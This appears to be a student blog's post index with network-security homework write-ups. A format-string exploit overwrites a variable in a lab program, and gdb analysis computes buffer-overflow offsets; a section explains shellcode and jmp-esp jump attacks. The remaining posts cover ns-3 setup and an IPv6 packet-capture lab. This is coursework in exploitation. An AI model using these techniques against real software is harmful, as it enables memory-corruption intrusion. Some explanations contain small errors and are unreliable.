解压进入文件夹 cd /Users/x x x/Downloads/ns-allinone-3.40 编译文件 ./build.py --enable-examples --enable-tests 注：记得提前安装好cmake brew install cmake 安装完成以后cd ns-3.40可以通过ls查看文件内容\n在ns-3.36版本之后，ns-3的构建系统从waf更改为CMake，并引入了一个名为ns3的Python脚本来替代waf\n运行第一个模拟仿真脚本 通过 ./ns3 run hello-simulator 运行\n测试的安装 1 agq@AGdeMacBook-Air ns-3.40 % ./test.py ","date":"2023-12-18T15:38:41+08:00","permalink":"https://anonymity-0.github.io/posts/ns-3%E5%88%9D%E4%B8%8A%E6%89%8B/","title":"NS 3初上手"},{"content":"题目：在32位的ubuntu16.04运行环境下，对格式化漏洞程序vul_formatstr2.c，参照 12.2.4的方法，说明如何修改程序，将变量B的值改成0x5678CDEF。\n在Ubuntu 64位系统上，使用以下命令来安装gcc多架构编译器和32位库：\nsudo apt-get install gcc-multilib libc6-dev-i386\n在编译C程序时，使用-m32选项来生成32位的可执行文件。例如： gcc -m32 -o v2 vul_formatstr2.c\nazureuser@MyServer:~/hw$ gdb v2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 0x0000122d \u0026lt;+0\u0026gt;: endbr32 0x00001231 \u0026lt;+4\u0026gt;: push %ebp 0x00001232 \u0026lt;+5\u0026gt;: mov %esp,%ebp 0x00001234 \u0026lt;+7\u0026gt;: push %ebx 0x00001235 \u0026lt;+8\u0026gt;: sub $0x414,%esp 0x0000123b \u0026lt;+14\u0026gt;: call 0x1130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x00001240 \u0026lt;+19\u0026gt;: add $0x2d8c,%ebx 0x00001246 \u0026lt;+25\u0026gt;: mov %gs:0x14,%eax 0x0000124c \u0026lt;+31\u0026gt;: mov %eax,-0xc(%ebp) 0x0000124f \u0026lt;+34\u0026gt;: xor %eax,%eax 0x00001251 \u0026lt;+36\u0026gt;: movl $0x3435,-0x418(%ebp) 0x0000125b \u0026lt;+46\u0026gt;: movl $0x5657,-0x414(%ebp) 0x00001265 \u0026lt;+56\u0026gt;: movl $0x7879,-0x410(%ebp) 0x0000126f \u0026lt;+66\u0026gt;: lea -0x410(%ebp),%eax 0x00001275 \u0026lt;+72\u0026gt;: push %eax 0x00001276 \u0026lt;+73\u0026gt;: lea -0x414(%ebp),%eax 0x0000127c \u0026lt;+79\u0026gt;: push %eax 0x0000127d \u0026lt;+80\u0026gt;: lea -0x418(%ebp),%eax 0x00001283 \u0026lt;+86\u0026gt;: push %eax 0x00001284 \u0026lt;+87\u0026gt;: lea -0x1fc4(%ebx),%eax 0x0000128a \u0026lt;+93\u0026gt;: push %eax 0x0000128b \u0026lt;+94\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001290 \u0026lt;+99\u0026gt;: add $0x10,%esp 0x00001293 \u0026lt;+102\u0026gt;: mov -0x410(%ebp),%ecx 0x00001299 \u0026lt;+108\u0026gt;: mov -0x414(%ebp),%edx 0x0000129f \u0026lt;+114\u0026gt;: mov -0x418(%ebp),%eax 0x000012a5 \u0026lt;+120\u0026gt;: push %ecx 0x000012a6 \u0026lt;+121\u0026gt;: push %edx 0x000012a7 \u0026lt;+122\u0026gt;: push %eax 0x000012a8 \u0026lt;+123\u0026gt;: lea -0x1fab(%ebx),%eax 0x000012ae \u0026lt;+129\u0026gt;: push %eax 0x000012af \u0026lt;+130\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012b4 \u0026lt;+135\u0026gt;: add $0x10,%esp 0x000012b7 \u0026lt;+138\u0026gt;: sub $0xc,%esp 0x000012ba \u0026lt;+141\u0026gt;: lea -0x1f94(%ebx),%eax 0x000012c0 \u0026lt;+147\u0026gt;: push %eax 0x000012c1 \u0026lt;+148\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x000012c6 \u0026lt;+153\u0026gt;: add $0x10,%esp 0x000012c9 \u0026lt;+156\u0026gt;: sub $0x8,%esp 0x000012cc \u0026lt;+159\u0026gt;: lea -0x40c(%ebp),%eax 0x000012d2 \u0026lt;+165\u0026gt;: push %eax 0x000012d3 \u0026lt;+166\u0026gt;: lea -0x1f7d(%ebx),%eax 0x000012d9 \u0026lt;+172\u0026gt;: push %eax 0x000012da \u0026lt;+173\u0026gt;: call 0x10e0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x000012df \u0026lt;+178\u0026gt;: add $0x10,%esp 0x000012e2 \u0026lt;+181\u0026gt;: sub $0xc,%esp 0x000012e5 \u0026lt;+184\u0026gt;: lea -0x40c(%ebp),%eax 0x000012eb \u0026lt;+190\u0026gt;: push %eax 0x000012ec \u0026lt;+191\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000012f1 \u0026lt;+196\u0026gt;: add $0x10,%esp 0x000012f4 \u0026lt;+199\u0026gt;: sub $0xc,%esp 0x000012f7 \u0026lt;+202\u0026gt;: lea -0x1f7a(%ebx),%eax 0x000012fd \u0026lt;+208\u0026gt;: push %eax 0x000012fe \u0026lt;+209\u0026gt;: call 0x10c0 \u0026lt;puts@plt\u0026gt; 0x00001303 \u0026lt;+214\u0026gt;: add $0x10,%esp 0x00001306 \u0026lt;+217\u0026gt;: mov -0x410(%ebp),%ecx 0x0000130c \u0026lt;+223\u0026gt;: mov -0x414(%ebp),%edx 0x00001312 \u0026lt;+229\u0026gt;: mov -0x418(%ebp),%eax 0x00001318 \u0026lt;+235\u0026gt;: push %ecx 0x00001319 \u0026lt;+236\u0026gt;: push %edx 0x0000131a \u0026lt;+237\u0026gt;: push %eax 0x0000131b \u0026lt;+238\u0026gt;: lea -0x1f78(%ebx),%eax 0x00001321 \u0026lt;+244\u0026gt;: push %eax 0x00001322 \u0026lt;+245\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x00001327 \u0026lt;+250\u0026gt;: add $0x10,%esp 0x0000132a \u0026lt;+253\u0026gt;: nop 0x0000132b \u0026lt;+254\u0026gt;: mov -0xc(%ebp),%eax 0x0000132e \u0026lt;+257\u0026gt;: xor %gs:0x14,%eax 0x00001335 \u0026lt;+264\u0026gt;: je 0x133c \u0026lt;formatstr_vul+271\u0026gt; 0x00001337 \u0026lt;+266\u0026gt;: call 0x13f0 \u0026lt;__stack_chk_fail_local\u0026gt; 0x0000133c \u0026lt;+271\u0026gt;: mov -0x4(%ebp),%ebx 0x0000133f \u0026lt;+274\u0026gt;: leave 0x00001340 \u0026lt;+275\u0026gt;: ret End of assembler dump. (gdb) b *(formatstr_vul+191) Breakpoint 1 at 0x12ec (gdb) r Starting program: /home/azureuser/hw/v2 \u0026amp;A=0xffffcde0 \u0026amp;B=0xffffcde4 C=0xffffcde8. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\nBreakpoint 1, 0x565562ec in formatstr_vul () (gdb) x/x $esp 0xffffcdd0: 0xffffcdec (gdb) p (0xbfffcdec-0xbfffcdd0)/4 $1 = 7\n因此，user_input的首地址为0xffffcdec，位于栈顶开始的第7个(4字 节）单元。\n关闭地址随机化机制: sudo sysctl -w kernel.randomize_va_space=0\n根据上面可知 \u0026amp;B=0xffffcde4=4294954468\n1 2 3 4 5 6 7 8 9 10 11 12 azureuser@MyServer:~/hw$ ./read2file Please enter an address. 4294954468 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%08x.%08x. The string length is 39 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026amp;A=0xffffce30 \u0026amp;B=0xffffce34 C=0xffffce38. A=0x3435 B=0x5657 C=0x7879. Please enter a string: ����ffffce3c.00005657.00007879.00003435.00005657.00007879.ffffcde4. New values A=0x3435 B=0x5657 C=0x7879. 变量B的地址送入堆栈，\u0026amp;B=0xffffce34 =4294954548\n编译 read2file2.c azureuser@MyServer:~/hw$ gcc -m32 -o read2file2 read2file2.c\n0xCDEF - 5*9 - 12 = 52662 0x5678 - 0xCDEF = -30583\n当尝试计算0x5678 - 0xCDEF时得到了负数，这是因为0x5678小于0xCDEF。为了解决这个问题，可以利用无符号整数的环绕性质。\n将负数-30583视为一个大的正数。具体来说，将-30583添加到2^16（即65536，因为%hn写入的是16位值）来得到一个正数：\n65536−30583=34953\n使用34953作为%hn的值来代替-30583。\n得到字符串： %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.\n命令行输入到文件mystring中\n1 2 3 4 5 6 azureuser@MyServer:~/hw$ ./read2file2 Please enter an address. 4294954548 Please enter the format string: %08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x. The string length is 70 将文件mystring作为输入重定向到漏洞程序，并将输出定向到 文件result.txt中：\n1 2 3 azureuser@MyServer:~/hw$ ./v2 \u0026lt; mystring \u0026gt; result.txt azureuser@MyServer:~/hw$ tail -n 1 result.txt New values A=0x3435 B=0x5678cdef C=0x7879. ","date":"2023-12-18T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/","title":"网络安全作业8"},{"content":"第九章 简述shellcode 的概念以及编写shellcode的步骤。\nshellcode是注入到目标进程中的二进制代码，其功能取决于编写者的意图。 编写shellcode要经过以下3个步骤： 编写简洁的能完成所需功能的C程序； 反汇编可执行代码，用系统功能调用代替函数调用，用汇编语言实现相同的功能； 提取出操作码，写成shellcode，并用C程序验证。 Linux环境下的shellcode为什么不调用libc中的库函数，而是利用系统调用？\n通过系统调用可以直接访问系统内核，具有非常强大的功能。 Shellcode 通常需要尽可能小，以便能够有效地注入到受限的内存空间或数据流中。直接使用系统调用比调用 libc 函数占用更少的空间，因为这避免了链接和加载整个库的开销。 在安全测试和渗透测试中，shellcode 需要尽可能隐蔽地执行。直接使用系统调用可能帮助绕过一些安全监测工具和防御机制，因为它们更多地关注对常见库函数的调用。 直接使用系统调用可以使shellcode更加独立和可移植。因为libc的版本和实现在不同的系统和环境中可能会有所不同，依赖于特定版本的libc函数可能会导致shellcode在某些环境下无法正常工作。 在攻击字符串中4字节的RET除了其取在攻击字符串中4字节的RET除了其取值范围要猜测准确外，还有什么需要考虑的（或者说有什么限制）？\n地址空间布局随机化，现代操作系统采用了地址随机化技术，缓冲区的起始地址是会动态变化的，必须在攻击串中放置足够多的NOP，以使得RET的取值范围足够大，才能猜测一个正确的RET。 RET指令的返回地址是函数返回时要跳转到的地址。如果返回地址指向了程序的不可执行代码区域，则攻击也将失败。 一些程序可能会使用栈保护来防止溢出攻击。例如，程序可能会设置栈的大小限制，或者使用栈保护指令来检查栈是否溢出。 RET指令的地址必须具有可写权限。如果RET指令的地址具有只读权限，则程序将无法修改该地址。 如果RET地址包含零字节，那么在某些情况下，程序可能会提前终止字符串的处理，这可能会阻止攻击的进行。 第十章 简述进程跳转攻击方法的基本思想\n从系统必须加载的动态链接库(如ntdll.dll，kernel32.dll)中寻找call esp和jmp esp指令，记录下该地址（溢出攻击的跳转地址），将该地址覆盖函数的返回地址，而将shellcode放在返回地址所在单元的后面。 这样就确保溢出后通过动态链接库中的指令而跳转到被注入到进程堆栈中的shellcode。 ","date":"2023-12-13T21:46:25+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/","title":"网络安全作业6"},{"content":"得分：10/10\nC程序homework08.c的主函数如下：\n1 2 3 4 5 6 7 8 9 10 11 12 int main(int argc, char * argv[]) { init_buf(Lbuffer, LEN); switch(argc) { case 1: f00(); break; case 2: f01(); break; case 3: f02(); break; default: f00(); break; } puts(\u0026#34;Done.\\nThe program exited normally.\u0026#34;); return 0; } 在32位的ubuntu16.04系统中用gcc -fno-stack-protector 编译该程序，得到的可执行程序见附件，通过gdb调试，对f00()、f01()和f02()进行分析： (1) 函数f00()、f01()和f02()是否导致段错误。 如果没有命令行参数（argc 等于 1，因为程序名本身也算一个参数），则执行函数 f00()。 如果有一个命令行参数（argc 等于 2），则执行函数 f01()。 如果有两个命令行参数（argc 等于 3），则执行函数 f02()。 如果有三个或更多的命令行参数，还是执行函数 f00()。 ![[Pasted image 20231122231415.png]] 函数foo(), 和 foo01() 都会导致段错误。\n如果函数f00()、f01()和f02()导致段错误，计算出被攻击的缓冲区首地址与函数的返回地址所在的栈地址的距离（即偏移OFFSET)，给出溢出后函数的返回地址(用16进制数表示)。 f00() ![[Pasted image 20231121150016.png]]\n打断点 函数入口处的堆栈指针esp指向的栈（地址为0xffffd1dc）保存了 函数f00()返回到调用函数(main)的地址（0x080485a8），即“函数的返回地址”\n记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1dc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (gdb) x/x $esp 0xffffd1dc: 0x080485a8 (gdb) c Continuing. Breakpoint 2, 0x080484e9 in f00 () 1: x/i $eip =\u0026gt; 0x80484e9 \u0026lt;f00+24\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x/x $esp 0xffffd140: 0xffffd155 (gdb) 0xffffd144: 0x0804a060 (gdb) x/x 0x0804a060 0x804a060 \u0026lt;Lbuffer\u0026gt;: 0x44434241 令B = 0xffffd155，则offset=A-B=0xffffd1dc - 0xffffd155 =0x87=135。\n1 2 3 4 5 6 7 8 9 10 (gdb) c Continuing. Breakpoint 3, 0x080484f3 in f00 () 1: x/i $eip =\u0026gt; 0x80484f3 \u0026lt;f00+34\u0026gt;: ret (gdb) x/x $esp 0xffffd1dc: 0x49484746 (gdb) x/s $esp 0xffffd1dc: \u0026#34;FGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVW\u0026#34;... 执行ret之前的堆栈的内容可以推断执行ret后将跳到地址0x49484746去执行\nf01 执行程序\n1 azureuser@MyServer:~/hw$ gdb homework08 main\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 (gdb) disas main Dump of assembler code for function main: 0x0804856c \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx 0x08048570 \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp 0x08048573 \u0026lt;+7\u0026gt;: pushl -0x4(%ecx) 0x08048576 \u0026lt;+10\u0026gt;: push %ebp 0x08048577 \u0026lt;+11\u0026gt;: mov %esp,%ebp 0x08048579 \u0026lt;+13\u0026gt;: push %ebx 0x0804857a \u0026lt;+14\u0026gt;: push %ecx 0x0804857b \u0026lt;+15\u0026gt;: mov %ecx,%ebx 0x0804857d \u0026lt;+17\u0026gt;: sub $0x8,%esp 0x08048580 \u0026lt;+20\u0026gt;: push $0x400 0x08048585 \u0026lt;+25\u0026gt;: push $0x804a060 0x0804858a \u0026lt;+30\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x0804858f \u0026lt;+35\u0026gt;: add $0x10,%esp 0x08048592 \u0026lt;+38\u0026gt;: mov (%ebx),%eax 0x08048594 \u0026lt;+40\u0026gt;: cmp $0x2,%eax 0x08048597 \u0026lt;+43\u0026gt;: je 0x80485aa \u0026lt;main+62\u0026gt; 0x08048599 \u0026lt;+45\u0026gt;: cmp $0x3,%eax 0x0804859c \u0026lt;+48\u0026gt;: je 0x80485b1 \u0026lt;main+69\u0026gt; 0x0804859e \u0026lt;+50\u0026gt;: cmp $0x1,%eax 0x080485a1 \u0026lt;+53\u0026gt;: jne 0x80485b8 \u0026lt;main+76\u0026gt; 0x080485a3 \u0026lt;+55\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485a8 \u0026lt;+60\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485aa \u0026lt;+62\u0026gt;: call 0x80484f4 \u0026lt;f01\u0026gt; 0x080485af \u0026lt;+67\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b1 \u0026lt;+69\u0026gt;: call 0x8048530 \u0026lt;f02\u0026gt; 0x080485b6 \u0026lt;+74\u0026gt;: jmp 0x80485be \u0026lt;main+82\u0026gt; 0x080485b8 \u0026lt;+76\u0026gt;: call 0x80484d1 \u0026lt;f00\u0026gt; 0x080485bd \u0026lt;+81\u0026gt;: nop 0x080485be \u0026lt;+82\u0026gt;: sub $0xc,%esp 0x080485c1 \u0026lt;+85\u0026gt;: push $0x8048660 0x080485c6 \u0026lt;+90\u0026gt;: call 0x8048330 \u0026lt;puts@plt\u0026gt; 0x080485cb \u0026lt;+95\u0026gt;: add $0x10,%esp 0x080485ce \u0026lt;+98\u0026gt;: mov $0x0,%eax 0x080485d3 \u0026lt;+103\u0026gt;: lea -0x8(%ebp),%esp 0x080485d6 \u0026lt;+106\u0026gt;: pop %ecx 0x080485d7 \u0026lt;+107\u0026gt;: pop %ebx 0x080485d8 \u0026lt;+108\u0026gt;: pop %ebp 0x080485d9 \u0026lt;+109\u0026gt;: lea -0x4(%ecx),%esp 0x080485dc \u0026lt;+112\u0026gt;: ret End of assembler dump. f01()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (gdb) disas f01 Dump of assembler code for function f01: 0x080484f4 \u0026lt;+0\u0026gt;: push %ebp 0x080484f5 \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x080484f7 \u0026lt;+3\u0026gt;: sub $0x508,%esp 0x080484fd \u0026lt;+9\u0026gt;: sub $0x8,%esp 0x08048500 \u0026lt;+12\u0026gt;: push $0x400 0x08048505 \u0026lt;+17\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804850b \u0026lt;+23\u0026gt;: push %eax 0x0804850c \u0026lt;+24\u0026gt;: call 0x804846b \u0026lt;init_buf\u0026gt; 0x08048511 \u0026lt;+29\u0026gt;: add $0x10,%esp 0x08048514 \u0026lt;+32\u0026gt;: sub $0x8,%esp 0x08048517 \u0026lt;+35\u0026gt;: lea -0x4fe(%ebp),%eax 0x0804851d \u0026lt;+41\u0026gt;: push %eax 0x0804851e \u0026lt;+42\u0026gt;: lea -0xfe(%ebp),%eax 0x08048524 \u0026lt;+48\u0026gt;: push %eax 0x08048525 \u0026lt;+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; 0x0804852a \u0026lt;+54\u0026gt;: add $0x10,%esp 0x0804852d \u0026lt;+57\u0026gt;: nop 0x0804852e \u0026lt;+58\u0026gt;: leave 0x0804852f \u0026lt;+59\u0026gt;: ret End of assembler dump. 设置断点\n1 2 3 4 5 6 (gdb) b*(f01+0) Breakpoint 1 at 0x80484f4 (gdb) b*(f01+49) Breakpoint 2 at 0x8048525 (gdb) b*(f01+59) Breakpoint 3 at 0x804852f 1 2 3 4 5 6 7 8 9 10 11 12 13 (gdb) display/i $eip 1: x/i $eip \u0026lt;error: No registers.\u0026gt; (gdb) x/i $eip No registers. (gdb) run 1 Starting program: /home/azureuser/hw/homework08 1 Breakpoint 1, 0x080484f4 in f01 () 1: x/i $eip =\u0026gt; 0x80484f4 \u0026lt;f01\u0026gt;: push %ebp (gdb) x/x $esp 0xffffd1cc: 0x080485af 记录堆栈指针esp的值，在此以A标记：A=$esp = 0xffffd1cc\n继续执行到下一个断点\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) c Continuing. Breakpoint 2, 0x08048525 in f01 () 1: x/i $eip =\u0026gt; 0x8048525 \u0026lt;f01+49\u0026gt;: call 0x8048320 \u0026lt;strcpy@plt\u0026gt; (gdb) x $esp 0xffffccb0: 0xffffd0ca (gdb) 0xffffccb4: 0xffffccca (gdb) x/x 0xffffccca 0xffffccca: 0x44434241 B=0xffffd0ca。\noffset=A-B= 0xffffd1cc - 0xffffd0ca =0x102=258。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) c Continuing. Breakpoint 3, 0x0804852f in f01 () 1: x/i $eip =\u0026gt; 0x804852f \u0026lt;f01+59\u0026gt;: ret (gdb) x/x $esp 0xffffd1cc: 0x42415a59 (gdb) x/s $esp 0xffffd1cc: \u0026#34;YZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOP\u0026#34;... (gdb) si 0x42415a59 in ?? () 1: x/i $eip =\u0026gt; 0x42415a59: \u0026lt;error: Cannot access memory at address 0x42415a59\u0026gt; (gdb) x/s $esp 0xffffd1d0: \u0026#34;CDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRST\u0026#34;... 返回地址变 为 0x42415a59\n其他（本次实验的一些其它尝试） 由于这个可执行文件是ubuntu16.04编译的，本身我的虚拟机系统是ubuntu18.04，一开始执行文件老是报错： 1 2 ~$ ./homework08 -bash: ./homework08: No such file or directory 查询之后发现不是文件不存在，是缺少需要的依赖，因为Ubuntu18.04默认去掉了32bit的library。\n解决方法\n1 sudo apt-get install lib32z1 之后就可以执行了。\n本身自己的电脑是mac m2芯片，一开始没尝试使用虚拟机而是docker在容器内去pull ubuntu的镜像来尝试实验：% docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --platform linux/386 -v \u0026quot;/Users/agq/Downloads/srcToStudent:/srcToStudent\u0026quot; --name=hw6 i386/ubuntu /bin/bash 发现能运行文件，并且可以显示段错误：\n但由于qemu天生不支持ptrace系统调用，而gdb正是依赖这个系统调用，所以无法进行调试（QEMU\u0026rsquo;s user-mode emulation does not support the ptrace system call）所以第二题就做不了，遂作罢。\n","date":"2023-11-24T15:55:04+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/","title":"网络安全作业5"},{"content":"基本操作 查看并记录 HostA 和 S 的 IPv6(ens5 scope:link) 地址 命令 ifconfig ens5。 命令解释 ifconfig是一个用于配置和显示Linux操作系统网络接口信息的命令。当执行ifconfig ens5命令时，它会显示ens5网络接口的配置信息，包括IP地址、子网掩码、MAC地址、数据包统计等。\nIPv6 连接： HostA 的终端 1 中执行 `sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5`。 HostA 的终端 2 中执行 `ping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5`。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获指定主机HostA和另一台主机S之间通过ens5网络接口的IPv6通信数据包。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5 这个命令的作用是向指定的IPv6地址发送一个ICMPv6 Echo Request数据包，以测试与目标主机S的连通性。其中-c 1表示只发送一个数据包，S 的 IPv6(ens5 scope:link）地址表示目标主机S的IPv6地址，%ens5表示指定使用ens5网络接口发送数据包。\n结果 【实验要求】：此步骤需要记录终端 1 中抓到的 2 个报文数据，表明哪个是请求报文，哪个是回复报文。根据 IPv6 协议报文格式分析上述 tcpdump 抓包结果，要求画出 IPv6 以及 ICMPv6 的基本报头结构并将各个字段分别填入其中 (例如 IP 协议版本、源地址和目的地址、源端口和目的端口、报文含义等)。对这个报文的含义加以解释。\n第一个报文是请求报文，第二个报文是回复报文。\n第一个报文的IPv6报头如下：\n1 2 3 4 5 6 7 8 Version: 6 Traffic Class: 0 Flow Label: 0 Payload Length: 64 Next Header: ICMPv6 (58) Hop Limit: 64 Source Address: fe80::f816:3eff:fea7:a942 Destination Address: fe80::f816:3eff:fee7:f7b3 1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fea7:a942 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | fe80::f816:3eff:fee7:f7b3 | +--------------------------------------------------------------+ ICMPv6报头如下：\n1 2 3 4 5 Type: ICMPv6 Echo Request (128) Code: 0 Checksum: 0x158e Identifier: 0x0001 Sequence Number: 1 第二个报文的IPv6报头如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 +-------------+----------------+------------+------------------+ | Version | Traffic Class | Flow Label | Payload Length | +-------------+----------------+------------+------------------+ | 6 | 0 | 0 | 64 | +-------------+----------------+------------+------------------+ | Next Header | Hop Limit | Source Address | +-------------+----------------+-------------------------------+ | 58 | 64 | fe80::f816:3eff:fee7:f7b3 | +---------------+----------------+-----------------------------+ | Destination Address | +--------------------------------------------------------------+ | e80::f816:3eff:fea7:a942 | +--------------------------------------------------------------+ ICMPv6报头如下：\n1 2 3 4 5 Type: ICMPv6 Echo Reply (129) Code: 0 Checksum: 0x0506 Identifier: 0x0001 Sequence Number: 1 根据ICMPv6报文的类型和代码，可以判断第一个报文是ICMPv6 Echo Request报文，第二个报文是ICMPv6 Echo Reply报文。\nICMPv6 Echo Request报文用于请求对端发送Echo Reply报文。第一个报文的源地址是fe80::f816:3eff:fea7:a942，目的地址是fe80::f816:3eff:fee7:f7b3。序列号为1，表示这是第一个请求报文。\nICMPv6 Echo Reply报文用于响应ICMPv6 Echo Request报文。第二个报文的源地址是fe80::f816:3eff:fee7:f7b3，目的地址是fe80::f816:3eff:fea7:a942。序列号为1，表示这是对第一个请求报文的响应 上述tcpdump抓包结果表明，两个主机之间正在进行ICMPv6 Echo测试。\n路由器公告报文 路由器公告报文的目的地址为 IPv6 组播地址中的“全节点地址”，它的地址是FF02::1，可用 tcpdump 侦听路由器公告报文。HostA 中另开一个终端 3 用于侦听路由器公告报文，命令为： sudo tcpdump –vxn host ff02::1 -i ens5\n【实验要求】记录 HostA 的终端 3 中 tcpdump 抓包得到的数据。由于路由器公告报文的发送有一定地周期，因此这里可能需要等待较长时间，可以把终端 3 最小化继续进行其他实验，等有结果后记录抓包得到的数据。如仍未顺利抓到此包，也可以参考附录中的图 4 回答下述问题。根据 tcpdump 抓取到的报文数据说明路由器通告报文通告了哪些信息并简单解释网络中的其它主机将会如何使用这些信息？\n命令解释 这个命令的作用是使用tcpdump工具来捕获发送到IPv6组播地址ff02::1的数据包，该地址是IPv6中的所有节点组播地址。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\n结果 根据 tcpdump 抓取到的报文数据，路由器通告报文通告了以下信息：\n源地址：fe80::f816:3eff:fee6:e881 目标地址：ff02::1 路由前缀：2001:db8:85a3::/64 生命周期 网络中的其它主机将会使用这些信息来进行以下操作：\n获取路由信息：主机可以使用路由前缀信息来构建自己的路由表，从而能够将数据包发送到目的网络。 自动配置地址：如果路由器通告了 M 比特为 1，则主机将使用 DHCPv6 服务来获取 IPv6 地址。 启用 IPv6 邻居发现：主机可以使用路由器通告中的链路层选项来启用 IPv6 邻居发现。 地址解析 地址解析的目的是通过对端的 IP 获取对端的 MAC 地址。由于地址解析过程会在数据发送前自动进行，因此需要先用 tcpdump 侦听，再 ping 对端，即可观察到NS 和 NA 报文。\nHostA 的终端 1 执行命令 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 HostA 的终端 2 执行命令 ping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 命令解释 sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 -i ens5 这个命令的作用是使用tcpdump工具来捕获发送到特定IPv6地址（HostA的IPv6地址，ens5接口，scope为link）的数据包，其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。\nping6 -c 1 HostB 的 IPv6(ens5 scope:link）地址%ens5。 这个命令的作用是向指定的IPv6地址（HostB的IPv6地址，ens5接口，scope为link）发送一个ICMPv6数据包，-c 1表示只发送一个数据包。在IPv6地址后面加上%ens5是为了指定数据包通过ens5接口发送。\n结果 【实验要求】：记录 HostA 的终端 1 中观察到邻居请求 (NS) 和邻居通告 (NA) 报文。根据抓取到的报文数据说明邻居请求及邻居公告报文通告了哪些信息，这些信息有什么作用？\n从抓取到的报文数据来看，邻居请求 (NS) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fea7:a942 